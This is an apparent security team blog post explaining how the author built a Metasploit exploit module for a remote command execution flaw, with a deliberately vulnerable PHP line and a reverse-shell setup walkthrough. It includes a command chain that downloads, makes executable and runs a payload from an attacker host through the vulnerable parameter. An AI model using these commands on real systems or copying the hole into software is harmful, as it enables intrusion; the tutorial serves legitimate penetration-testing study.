.299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.098039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.66274509803922"></fefuncg><fefuncb type="table" tablevalues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg>
	<div id="wrap_all">

	
<header id="header" class="all_colors header_color light_bg_color  av_header_top av_logo_left av_main_nav_header av_menu_right av_large av_header_sticky av_header_shrinking av_header_stretch_disabled av_mobile_menu_phone av_header_searchicon av_header_unstick_top av_seperator_small_border av_bottom_nav_disabled " data-av_shrink_factor="50" role="banner" itemscope="itemscope" itemtype="https://schema.org/WPHeader">

		<div id="header_main" class="container_wrap container_wrap_logo">

        <div class="container av-logo-container">
<div class="inner-container">
<span class="logo avia-standard-logo"><a href="/" class=""><img src="/wp-content/uploads/2020/09/logo-teamrot-300x90.png" height="100" width="300" alt="Team ROT Information Security" title=""></a></span><nav class="main_menu" data-selectname="Select a page" role="navigation" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement"><div class="avia-menu av-main-nav-wrap"><ul role="menu" class="menu av-main-nav" id="avia-menu">
<li role="menuitem" id="menu-item-2013" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-top-level menu-item-top-level-1"><a href="/" itemprop="url" tabindex="0"><span class="avia-bullet"></span><span class="avia-menu-text">/team</span><span class="avia-menu-fx"><span class="avia-arrow-wrap"><span class="avia-arrow"></span></span></span></a></li>
<li role="menuitem" id="menu-item-1844" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-2 current-menu-item"><a href="/team-blog/" itemprop="url" tabindex="0"><span class="avia-bullet"></span><span class="avia-menu-text">/blog</span><span class="avia-menu-fx"><span class="avia-arrow-wrap"><span class="avia-arrow"></span></span></span></a></li>
<li role="menuitem" id="menu-item-1843" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-3"><a href="/contact/" itemprop="url" tabindex="0"><span class="avia-bullet"></span><span class="avia-menu-text">/contact</span><span class="avia-menu-fx"><span class="avia-arrow-wrap"><span class="avia-arrow"></span></span></span></a></li>
<li id="menu-item-search" class="noMobile menu-item menu-item-search-dropdown menu-item-avia-special" role="menuitem"><a aria-label="Search" href="?s=" rel="nofollow" data-avia-search-tooltip="

&lt;form role=&quot;search&quot; action=&quot;https://teamrot.fi/&quot; id=&quot;searchform&quot; method=&quot;get&quot; class=&quot;&quot;&gt;
	&lt;div&gt;
		&lt;input type=&quot;submit&quot; value=&quot;&quot; id=&quot;searchsubmit&quot; class=&quot;button avia-font-entypo-fontello&quot; /&gt;
		&lt;input type=&quot;text&quot; id=&quot;s&quot; name=&quot;s&quot; value=&quot;&quot; placeholder=&#039;Search&#039; /&gt;
			&lt;/div&gt;
&lt;/form&gt;
" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello"><span class="avia_hidden_link_text">Search</span></a></li>
<li class="av-burger-menu-main menu-item-avia-special av-small-burger-icon">
	        			<a href="#" aria-label="Menu" aria-hidden="false">
							<span class="av-hamburger av-hamburger--spin av-js-hamburger">
								<span class="av-hamburger-box">
						          <span class="av-hamburger-inner"></span>
						          <strong>Menu</strong>
								</span>
							</span>
							<span class="avia_hidden_link_text">Menu</span>
						</a>
	        		   </li>
</ul></div></nav>
</div> </div> 
		<!-- end container_wrap-->
		</div>
		<div class="header_bg"></div>

<!-- end header -->
</header>

	<div id="main" class="all_colors" data-scroll-offset="116">

	<div class="main_color container_wrap_first container_wrap fullsize">
<div class="container av-section-cont-open">
<main role="main" itemscope="itemscope" itemtype="https://schema.org/Blog" class="template-page content  av-content-full alpha units"><div class="post-entry post-entry-type-page post-entry-313"><div class="entry-content-wrapper clearfix">
<p>Lets go through an exploit module I built for Metasploit Framework.<br>
In a nutshell, the exploit contains only a couple of key elements &#8211; a HTTP Client and Server and a generated malicious payload.<br>
I needed an easy way to abuse a <em>Remote Command Execution</em> vulnerability. A&nbsp;full exploit module that would generate the selected payload and return a meterpreter reverse shell back to me. All in one go.<br>
Generally, exploit development is much more time consuming &#8211; and sometimes even more difficult &#8211; than just &#8220;triggering&#8221; the found vulnerability with a HTTP Request for instance.<br>
What this exploit module does, is it exploits a <em>RCE</em> vulnerability via a malicious <em>HTTP GET</em> request.<br>
Whats required from the victim, is that a linux &#8216;<em>wget&#8217;</em> tool is installed, which is very common. &nbsp; &nbsp;&#8230; and of course that there is a RCE vulnerability that allows the attacker to run shell commands.<br>
Here is an example of PHP Code that would create such a vulnerability.</p>
<pre><em>https://rot.fi/vulnerable_url.php:
&nbsp;&lt;?php exec($_GET['cmd']); ?&gt;</em></pre>
<p>You would simple call this URL by <em><strong>https://rot.fi/vulnerable_url.php?cmd=hostname</strong></em><br>
and that would result the backend webserver to run this the supplied command &#8216;hostname&#8217;. You wouldn&#8217;t see the result on page, as it is not printed on it.<br>
I&#8217;ll break down the module and try to explain each part of it.</p>
<h1>Foundations()</h1>
<p>In order to get this module working, we need to define that it&#8217;s a Metasploit <span style="text-decoration: underline;">Exploit</span> Module, and include the required libraries.<br>
To define a module type, you define it in the <strong>class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit.</strong><br>
For an auxiliary module, you would use <strong>class MetasploitModule &lt; Msf::Auxiliary</strong></p>
<blockquote>
<div class="codebox">require&nbsp;&#8216;msf/core&#8217;<br>
class&nbsp;MetasploitModule&nbsp;&lt;&nbsp;Msf::Exploit<br>
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span><br>
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span><br>
include&nbsp;<span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML</span>
</div>
</blockquote>
<h1><span style="color: #0000ff;"><span style="color: #333333;">OnesAndZeros()</span></span></h1>
<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #008000;">EXE</span>, is what you need to generate a binary payload.<br>
This guy is essential to our specific need to respond to a <em>HTTP GET</em> request with a file that&#8217;s loaded with goodies.</p>
<h1>TriggerVuln()</h1>
<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span>&nbsp;, is what we&#8217;ll be using to poke the target and have it request a file from us.<br>
<span style="color: #008000;">HttpClient</span>&nbsp;will introduce you to four&nbsp;extra Opts &#8211; <strong>RHOST,</strong>&nbsp;<strong>RPORT,SSL and VHOST &#8211;</strong>&nbsp;which will be used to define which server and port we want use to send the HTTP requests to and <strong>VHOST</strong> for defining what kind of <em>HTTP Host</em>-header we want to use. The <strong>SSL</strong> Opt is a boolean defining whether or not the client connection is encrypted.<br>
Above, I gave you an example of running a &#8216;<strong><em>hostname</em></strong>&#8216; command on the vulnerable server, which would likely be of no benefit to the attacker.<br>
For this case, I would use a chained command that would firstly download my evil binary payload, give it execute permissions and then run it&#8230;<br>
&#8230;like &#8216;<em><strong>wget 10.0.0.1/evil -O /tmp/evil;chmod 777 /tmp/evil;/tmp/evil</strong></em>&#8216;<br>
In a HTTP Request, it would look something like this</p>
<blockquote>
<p>https://rot.fi/vulnerable_url.php?<strong>cmd</strong>=<span style="color: #ff0000;"><em><strong>wget 10.0.0.1/evil -O /tmp/evil</strong></em></span><br>
https://rot.fi/vulnerable_url.php?<strong>cmd=</strong><span style="color: #ff0000;"><em><strong>chmod 777 /tmp/evil<br>
</strong></em></span><br>
https://rot.fi/vulnerable_url.php?<strong>cmd</strong><strong>=</strong><span style="color: #ff0000;"><em><strong>/tmp/evil</strong></em></span></p>
</blockquote>
<h1>HereToServe()</h1>
<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML<span style="color: #333333;">, is what we use to deliver requested the payload.</span></span><br>
The <span style="color: #008000;">HttpServer</span>&nbsp;will introduce you to two extra Opts, <strong>SRVHOST</strong> and <strong>SRVPORT</strong> and it has two key functions you need to notice. The Opts will define which IP and port the HttpServer will bind to.</p>
<h2>
<span style="color: #808000;">def</span> <strong>primer</strong>
</h2>
<p>What is defined here runs when the <span style="color: #808000;">HttpServer</span> is started but still before any connections are accepted in.<br>
We don&#8217;t need to do anything here, this time.</p>
<h2>
<span style="color: #808000;">def</span> <strong>on_request_uri(cli, req)</strong>
</h2>
<p>This function is called each time a request comes in.<br>
What is noteworthy is that the <strong>on_request_uri</strong> is called when the exact <em>URI</em> is called, which we will be defining later in the module.<br>
In this function I&#8217;m generating the binary payload on each request and sending it back to the client.<br>
What the payload will contain, will be the one you choose while configuring the exploit.<br>
<img decoding="async" class=" size-full wp-image-568 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/on_request.jpg" alt="on_request.JPG" width="460" height="117" srcset="/wp-content/uploads/2017/02/on_request.jpg 460w, /wp-content/uploads/2017/02/on_request-300x76.jpg 300w" sizes="(max-width: 460px) 100vw, 460px"></p>
<h1>Initialize()</h1>
<p>For an exploit module, you need to define a target, and the <strong>register_options</strong> are used by the HTTP Server library.<br>
In the initialize function you also define the Name, Author and License for your creation, among other things. For a BufferOverflow exploit, you&#8217;d define bad characters and usually multiple targets like kernel versions and such.<br>
Also, notice that the <strong>register_options</strong> Opts are typecasted, to strings, integers, etc..<br>
<img decoding="async" class=" size-full wp-image-543 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/initialize.jpg" alt="initialize" width="751" height="444" srcset="/wp-content/uploads/2017/02/initialize.jpg 751w, /wp-content/uploads/2017/02/initialize-300x177.jpg 300w, /wp-content/uploads/2017/02/initialize-705x417.jpg 705w" sizes="(max-width: 751px) 100vw, 751px"></p>
<h1>Code()</h1>
<p>A Metasploit Exploit will be using a exploit and check functions.</p>
<h2><strong><span style="color: #808000;">def</span> check</strong></h2>
<p>This function is supposed to be used to check if the target is vulnerable. Sometimes its not even possible but its best to have even partial check than to launch an exploit script against a target that&#8217;s not even online.<br>
<img decoding="async" class=" size-full wp-image-555 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/check.jpg" alt="check" width="472" height="248" srcset="/wp-content/uploads/2017/02/check.jpg 472w, /wp-content/uploads/2017/02/check-300x158.jpg 300w" sizes="(max-width: 472px) 100vw, 472px"><br>
The above check function sends a GET request at the <strong>RHOST </strong>and checks if the HTTP return code is OK or not.<br>
Based on the HTTP code, we return a Vulnerable or a Safe status to the exploit module.</p>
<h2><strong><span style="color: #808000;">def</span> exploit</strong></h2>
<p>In most cases, this is where the magic happens.<br>
You can rewrite <strong>Opts</strong> by manipulating the <strong>datastore[]</strong> array.<br>
The <span style="color: #008000;">HTTPServer</span> is started as a new instance with the <strong><span style="color: #000000;">start_service()</span></strong> function.<br>
By&nbsp;setting <strong>SSL</strong> <strong>Opt</strong> to <span style="color: #808000;">true</span>/<span style="color: #808000;">false</span>&nbsp;you can choose whether you want to start&nbsp;the <span style="color: #008000;">HTTPServer</span>&nbsp;with Transport Layer Security.<br>
<img decoding="async" class=" size-full wp-image-556 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/exploit.jpg" alt="exploit" width="541" height="463" srcset="/wp-content/uploads/2017/02/exploit.jpg 541w, /wp-content/uploads/2017/02/exploit-300x257.jpg 300w" sizes="(max-width: 541px) 100vw, 541px"><br>
I&#8217;ve put in a <strong>sleep(150)&nbsp;</strong>because sometime it takes time for the victim to execute the payload, so we don&#8217;t want our script to die before that happens.<br>
The actual exploitation takes place in the <strong>request</strong> function</p>
<h2><strong><span style="color: #808000;">def</span> request</strong></h2>
<p><img decoding="async" class=" size-full wp-image-557 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/request.jpg" alt="request" width="538" height="266" srcset="/wp-content/uploads/2017/02/request.jpg 538w, /wp-content/uploads/2017/02/request-300x148.jpg 300w" sizes="(max-width: 538px) 100vw, 538px"></p>
<h1>What now?</h1>
<p>So whats really cool about a exploit module like this, is that you get it all &nbsp;in the Swiss army knife we call Metasploit Framework.<br>
Instead of using this module, we could do the same manually:</p>
<ol>
<li>Setup and configure an Apache Web server</li>
<li>Create a binary payload with <strong>msfvenom</strong> manually</li>
<li>Setup a Listener / &nbsp;Handler to grab the shell</li>
<li>Trigger the vulnerability with curl/wget</li>
</ol>
<p>Yes, I guess if you compare the time it takes to develop a working module to the time it takes to do the above four steps, the latter wins.<br>
Let me demonstrate you how this is exploited via the working module.<br>
Firstly, you need to download and add the module to Metasploit</p>
<pre>git clone https://github.com/jake08/Metasploit
mv Metasploit/rot_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http</pre>
<p>Then start up msfconsole and find the module</p>
<blockquote>
<h6>msfconsole<br>
search rot_rce</h6>
<p><img decoding="async" class="alignnone size-full wp-image-612" src="http://165.232.69.132/wp-content/uploads/2017/02/msfsearch.jpg" alt="msfsearch" width="838" height="222" srcset="/wp-content/uploads/2017/02/msfsearch.jpg 838w, /wp-content/uploads/2017/02/msfsearch-300x79.jpg 300w, /wp-content/uploads/2017/02/msfsearch-768x203.jpg 768w, /wp-content/uploads/2017/02/msfsearch-705x187.jpg 705w" sizes="(max-width: 838px) 100vw, 838px"></p>
</blockquote>
<p>Then use and set it up according to your network<br>
here&#8217;s a friendly &nbsp;reminder what&#8217;s what:</p>
<ul>
<li>RHOST =&gt; Target Host that has the RCE Vulnerability</li>
<li>RPORT =&gt; Target Port for the above server</li>
<li>SRVHOST =&gt; The IP for the Local HTTP Server, make sure its reachable by RHOST</li>
<li>SRVPORT =&gt; Port for the above Server</li>
<li>VHOST =&gt; Virtual Host, or HTTP Host-header for RHOST eg. amazon.com, rot.fi</li>
<li>WRITABLEDIR =&gt; A Directory on the RHOST where we can drop the payload</li>
<li>PAYLOAD =&gt; Your friendly neighborhood reverse shell</li>
<li>LHOST =&gt; Return IP for the reverse shell, make sure its reachable by RHOST</li>
<li>LPORT =&gt; Port for above server</li>
</ul>
<blockquote>
<p><img decoding="async" class="alignnone size-full wp-image-627" src="http://165.232.69.132/wp-content/uploads/2017/02/setupexploit1.jpg" alt="setupexploit" width="843" height="705" srcset="/wp-content/uploads/2017/02/setupexploit1.jpg 843w, /wp-content/uploads/2017/02/setupexploit1-300x251.jpg 300w, /wp-content/uploads/2017/02/setupexploit1-768x642.jpg 768w, /wp-content/uploads/2017/02/setupexploit1-705x590.jpg 705w" sizes="(max-width: 843px) 100vw, 843px"></p>
</blockquote>
<p>Run check and&nbsp;exploit for profit.<a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb"><br>
</a></p>
<blockquote>
<p><img decoding="async" class="alignnone size-full wp-image-625" src="http://165.232.69.132/wp-content/uploads/2017/02/msfexploit.jpg" alt="msfexploit.JPG" width="646" height="474" srcset="/wp-content/uploads/2017/02/msfexploit.jpg 646w, /wp-content/uploads/2017/02/msfexploit-300x220.jpg 300w" sizes="(max-width: 646px) 100vw, 646px"></p>
</blockquote>
<h1></h1>
<h2>Additional resources</h2>
<p><a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb">Complete module code</a><br>
<a href="http://www.rubydoc.info/github/rapid7/metasploit-framework/">More on Metasploit Module development<br>
</a></p>
<p><strong>Logout</strong><br>
j3k, hacker</p>
</div></div></main><!-- close content main element --> <!-- section close by builder template -->		</div>
<!--end builder template-->
</div>
<!-- close default .container_wrap element -->

	
				<footer class="container_wrap socket_color" id="socket" role="contentinfo" itemscope="itemscope" itemtype="https://schema.org/WPFooter">
                    <div class="container">

                        <span class="copyright">© ROT - abuse@teamrot.fi - team@teamrot.fi </span>

                        
                    </div>

	            <!-- ####### END SOCKET CONTAINER ####### -->
				</footer>


					<!-- end main -->
		</div>

		<a class="avia-post-nav avia-post-prev without-image" href="/decomposing-lan-security-with-scapy-and-burp-suite/"><span class="label iconfont" aria-hidden="true" data-av_icon="" data-av_iconfont="entypo-fontello"></span><span class="entry-info-wrap"><span class="entry-info"><span class="entry-title">Decomposing LAN security with Scapy and Burp Suite</span></span></span></a><a class="avia-post-nav avia-post-next without-image" href="/tp-link-tl-sc3171g-ip-camera-r00t/"><span class="label iconfont" aria-hidden="true" data-av_icon="" data-av_iconfont="entypo-fontello"></span><span class="entry-info-wrap"><span class="entry-info"><span class="entry-title">TP-Link TL-SC3171G IP-camera r00t</span></span></span></a><!-- end wrap_all -->
</div>

<a href="#top" title="Scroll to top" id="scroll-top-link" aria-hidden="true" data-av_icon="" data-av_iconfont="entypo-fontello"><span class="avia_hidden_link_text">Scroll to top</span></a>

<div id="fb-root"></div>

<div class="avia-cookie-consent-wrap" aria-hidden="true">
<div class="avia-cookie-consent cookiebar-hidden  avia-cookiemessage-bottom" aria-hidden="true" data-contents="d816a4a28af4063081cc7d192148e522||v1.0"><div class="container">
<p class="avia_cookie_text">This site uses cookies. By continuing to browse the site, you are agreeing to our use of cookies.</p>
<a href="http://ec.europa.eu/ipg/basics/legal/cookies/index_en.htm" class="avia-button avia-color-theme-color-highlight avia-cookie-consent-button avia-cookie-consent-button-1 av-extra-cookie-btn  avia-cookie-link-btn ">Learn more</a><a href="#" class="avia-button avia-color-theme-color-highlight avia-cookie-consent-button avia-cookie-consent-button-2  avia-cookie-close-bar ">OK</a>
</div></div>
<div id="av-consent-extra-info" data-nosnippet class="av-inline-modal main_color avia-hide-popup-close">
<style type="text/css" data-created_by="avia_inline_auto" id="style-css-av-av_heading-e9726c5b3ba47c61a37656c1e7d02a7a">#top .av-special-heading.av-av_heading-e9726c5b3ba47c61a37656c1e7d02a7a{
margin:10px 0 0 0;
padding-bottom:10px;
}
body .av-special-heading.av-av_heading-e9726c5b3ba47c61a37656c1e7d02a7a .av-special-heading-tag .heading-char{
font-size:25px;
}
.av-special-heading.av-av_heading-e9726c5b3ba47c61a37656c1e7d02a7a .av-subheading{
font-size:15px;
}</style>
<div class="av-special-heading av-av_heading-e9726c5b3ba47c61a37656c1e7d02a7a av-special-heading-h3 blockquote modern-quote">
<h3 class="av-special-heading-tag" itemprop="headline">Cookie and Privacy Settings</h3>
<div class="special-heading-border"><div class="special-heading-inner-border"></div></div>
</div>
<br>
<style type="text/css" data-created_by="avia_inline_auto" id="style-css-av-jhe1dyat-381e073337cc8512c616f9ce78cc22d9">#top .hr.av-jhe1dyat-381e073337cc8512c616f9ce78cc22d9{
margin-top:0px;
margin-bottom:0px;
}
.hr.av-jhe1dyat-381e073337cc8512c616f9ce78cc22d9 .hr-inner{
width:100%;
}</style>
<div class="hr av-jhe1dyat-381e073337cc8512c616f9ce78cc22d9 hr-custom hr-left hr-icon-no"><span class="hr-inner inner-border-av-border-thin"><span class="hr-inner-style"></span></span></div>
<br><div class="tabcontainer av-jhds1skt-57ef9df26b3cd01206052db147fbe716 sidebar_tab sidebar_tab_left noborder_tabs" role="tablist">
<section class="av_tab_section av_tab_section av-av_tab-d287b68e58fb6a8d6e64cb096bf8f320"><div class="tab active_tab" role="tab" tabindex="0" data-fake-id="#tab-id-1" aria-controls="tab-id-1-content">How we use cookies</div>
<div id="tab-id-1-content" class="tab_content active_tab_content" aria-hidden="false"><div class="tab_inner_content invers-color">
<p>We may request cookies to be set on your device. We use cookies to let us know when you visit our websites, how you interact with us, to enrich your user experience, and to customize your relationship with our website. </p>
<p>Click on the different category headings to find out more. You can also change some of your preferences. Note that blocking some types of cookies may impact your experience on our websites and the services we are able to offer.</p>
</div></div></section><section class="av_tab_section av_tab_section av-av_tab-f61c0f855b027abeedf2bbf3c65f02d5"><div class="tab" role="tab" tabindex="0" data-fake-id="#tab-id-2" aria-controls="tab-id-2-content">Essential Website Cookies</div>
<div id="tab-id-2-content" class="tab_content" aria-hidden="true"><div class="tab_inner_content invers-color">
<p>These cookies are strictly necessary to provide you with services available through our website and to use some of its features.</p>
<p>Because these cookies are strictly necessary to deliver the website, refusing them will have impact how our site functions. You always can block or delete cookies by changing your browser settings and force blocking all cookies on this website. But this will always prompt you to accept/refuse cookies when revisiting our site.</p>
<p>We fully respect if you want to refuse cookies but to avoid asking you again and again kindly allow us to store a cookie for that. You are free to opt out any time or opt in for other cookies to get a better experience. If you refuse cookies we will remove all set cookies in our domain.</p>
<p>We provide you with a list of stored cookies on your computer in our domain so you can check what we stored. Due to security reasons we are not able to show or modify cookies from other domains. You can check these in your browser security settings.</p>
<div class="av-switch-aviaPrivacyRefuseCookiesHideBar av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-checked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyRefuseCookiesHideBar" class="aviaPrivacyRefuseCookiesHideBar " name="aviaPrivacyRefuseCookiesHideBar"><span class="toggle-track"></span><span class="toggle-label-content">Check to enable permanent hiding of message bar and refuse all cookies if you do not opt in. We need 2 cookies to store this setting. Otherwise you will be prompted again when opening a new browser window or new a tab.</span></label></div>
<div class="av-switch-aviaPrivacyEssentialCookiesEnabled av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-checked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyEssentialCookiesEnabled" class="aviaPrivacyEssentialCookiesEnabled " name="aviaPrivacyEssentialCookiesEnabled"><span class="toggle-track"></span><span class="toggle-label-content">Click to enable/disable essential site cookies.</span></label></div>
</div></div></section><section class="av_tab_section av_tab_section av-av_tab-cc829ea440e0fa4f3de3048758039e80"><div class="tab" role="tab" tabindex="0" data-fake-id="#tab-id-3" aria-controls="tab-id-3-content">Other external services</div>
<div id="tab-id-3-content" class="tab_content" aria-hidden="true"><div class="tab_inner_content invers-color">
<p>We also use different external services like Google Webfonts, Google Maps, and external Video providers. Since these providers may collect personal data like your IP address we allow you to block them here. Please be aware that this might heavily reduce the functionality and appearance of our site. Changes will take effect once you reload the page.</p>
<p>Google Webfont Settings:</p>
<div class="av-switch-aviaPrivacyGoogleWebfontsDisabled av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-unchecked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyGoogleWebfontsDisabled" class="aviaPrivacyGoogleWebfontsDisabled " name="aviaPrivacyGoogleWebfontsDisabled"><span class="toggle-track"></span><span class="toggle-label-content">Click to enable/disable Google Webfonts.</span></label></div>
<p>Google Map Settings:</p>
<div class="av-switch-aviaPrivacyGoogleMapsDisabled av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-unchecked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyGoogleMapsDisabled" class="aviaPrivacyGoogleMapsDisabled " name="aviaPrivacyGoogleMapsDisabled"><span class="toggle-track"></span><span class="toggle-label-content">Click to enable/disable Google Maps.</span></label></div>
<p>Google reCaptcha Settings:</p>
<div class="av-switch-aviaPrivacyGoogleReCaptchaDisabled av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-unchecked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyGoogleReCaptchaDisabled" class="aviaPrivacyGoogleReCaptchaDisabled " name="aviaPrivacyGoogleReCaptchaDisabled"><span class="toggle-track"></span><span class="toggle-label-content">Click to enable/disable Google reCaptcha.</span></label></div>
<p>Vimeo and Youtube video embeds:</p>
<div class="av-switch-aviaPrivacyVideoEmbedsDisabled av-toggle-switch av-cookie-disable-external-toggle av-cookie-save-unchecked av-cookie-default-checked"><label><input type="checkbox" checked id="aviaPrivacyVideoEmbedsDisabled" class="aviaPrivacyVideoEmbedsDisabled " name="aviaPrivacyVideoEmbedsDisabled"><span class="toggle-track"></span><span class="toggle-label-content">Click to enable/disable video embeds.</span></label></div>
</div></div></section><section class="av_tab_section av_tab_section av-av_tab-5f5085d493be16260717094fefe921f3"><div class="tab" role="tab" tabindex="0" data-fake-id="#tab-id-4" aria-controls="tab-id-4-content">Privacy Policy</div>
<div id="tab-id-4-content" class="tab_content" aria-hidden="true"><div class="tab_inner_content invers-color">
<p>You can read about our cookies and privacy settings in detail on our Privacy Policy Page. </p>
<a href="/?page_id=3" target="_blank">Privacy Policy</a>
</div></div></section>
</div>
<div class="avia-cookie-consent-modal-buttons-wrap">
<a href="#" class="avia-button avia-color-theme-color-highlight avia-cookie-consent-button avia-cookie-consent-button-3  avia-cookie-close-bar avia-cookie-consent-modal-button" title="Allow to use cookies, you always can modify used cookies and services">Accept settings</a><a href="#" class="avia-button avia-color-theme-color-highlight avia-cookie-consent-button avia-cookie-consent-button-4 av-extra-cookie-btn avia-cookie-consent-modal-button avia-cookie-hide-notification" title="Do not allow to use cookies or services - some functionality on our site might not work as expected.">Hide notification only</a>
</div>
</div>
</div>
 <script type="text/javascript">
 /* <![CDATA[ */  
var avia_framework_globals = avia_framework_globals || {};
    avia_framework_globals.frameworkUrl = 'https://teamrot.fi/wp-content/themes/enfold/framework/';
    avia_framework_globals.installedAt = 'https://teamrot.fi/wp-content/themes/enfold/';
    avia_framework_globals.ajaxurl = 'https://teamrot.fi/wp-admin/admin-ajax.php';
/* ]]> */ 
</script>
 
 <script type="text/javascript" src="/wp-includes/js/underscore.min.js?ver=1.13.4" id="underscore-js"></script>
<script type="text/javascript" id="avia-cookie-js-js-extra">
/* <![CDATA[ */
var AviaPrivacyCookieConsent = {"?":"Usage unknown","aviaCookieConsent":"Use and storage of Cookies has been accepted - restrictions set in other cookies","aviaPrivacyRefuseCookiesHideBar":"Hide cookie message bar on following page loads and refuse cookies if not allowed - aviaPrivacyEssentialCookiesEnabled must be set","aviaPrivacyEssentialCookiesEnabled":"Allow storage of site essential cookies and other cookies and use of features if not opt out","aviaPrivacyVideoEmbedsDisabled":"Do not allow video embeds","aviaPrivacyGoogleTrackingDisabled":"Do not allow Google Analytics","aviaPrivacyGoogleWebfontsDisabled":"Do not allow Google Webfonts","aviaPrivacyGoogleMapsDisabled":"Do not allow Google Maps","aviaPrivacyGoogleReCaptchaDisabled":"Do not allow Google reCaptcha","aviaPrivacyMustOptInSetting":"Settings are for users that must opt in for cookies and services","PHPSESSID":"Operating site internal cookie - Keeps track of your session","XDEBUG_SESSION":"Operating site internal cookie - PHP Debugger session cookie","wp-settings*":"Operating site internal cookie","wordpress*":"Operating site internal cookie","tk_ai*":"Shop internal cookie","woocommerce*":"Shop internal cookie","wp_woocommerce*":"Shop internal cookie","wp-wpml*":"Needed to manage different languages"};
var AviaPrivacyCookieAdditionalData = {"cookie_refuse_button_alert":"When refusing all cookies this site might not be able to work as expected. Please check our settings page and opt out for cookies or functions you do not want to use and accept cookies. You will be shown this message every time you open a new window or a new tab.\n\nAre you sure you want to continue?","no_cookies_found":"No accessable cookies found in domain","admin_keep_cookies":["PHPSESSID","wp-*","wordpress*","XDEBUG*"],"remove_custom_cookies":[],"no_lightbox":"We need a lightbox to show the modal popup. Please enable the built in lightbox in Theme Options Tab or include your own modal window plugin.\\n\\nYou need to connect this plugin in JavaScript with callback wrapper functions - see avia_cookie_consent_modal_callback in file enfold\\js\\avia-snippet-cookieconsent.js "};
/* ]]> */
</script>
<script type="text/javascript" id="avia_google_recaptcha_front_script-js-extra">
/* <![CDATA[ */
var AviaReCAPTCHA_front = {"version":"avia_recaptcha_v2","site_key2":"6LcDbpYUAAAAAJQvQuN2Hy24NaTws77QKO-yd0PV","site_key3":"6LcDbpYUAAAAAJQvQuN2Hy24NaTws77QKO-yd0PV","api":"https:\/\/www.google.com\/recaptcha\/api.js","api_lang":"en","avia_api_script":"\/wp-content\/themes\/enfold\/framework\/js\/conditional_load\/avia_google_recaptcha_api.js","theme":"light","score":"0.5","verify_nonce":"8aeb61435b","cannot_use":"<h3 class=\"av-recaptcha-error-main\">Sorry, a problem occurred trying to communicate with Google reCAPTCHA API. You are currently not able to submit the contact form. Please try again later - reload the page and also check your internet connection.<\/h3>","init_error_msg":"Initial setting failed. Sitekey 2 and\/or sitekey 3 missing in frontend.","v3_timeout_pageload":"Timeout occurred connecting to V3 API on initial pageload","v3_timeout_verify":"Timeout occurred connecting to V3 API on verifying submit","v2_timeout_verify":"Timeout occurred connecting to V2 API on verifying you as human. Please try again and check your internet connection. It might be necessary to reload the page.","verify_msg":"Verify....","connection_error":"Could not connect to the internet. Please reload the page and try again.","validate_first":"Please validate that you are a human first","validate_submit":"Before submitting we validate that you are a human first.","no_token":"Missing internal token on valid submit - unable to proceed.","invalid_version":"Invalid reCAPTCHA version found.","api_load_error":"Google reCAPTCHA API could not be loaded."};
/* ]]> */
</script>
<script type="text/javascript" src="/wp-content/themes/enfold/config-lottie-animations/assets/lottie-player/dotlottie-player.js?ver=5.5" id="avia-dotlottie-script-js"></script>
<script type="text/javascript" id="avia-footer-scripts-js-extra">
/* <![CDATA[ */
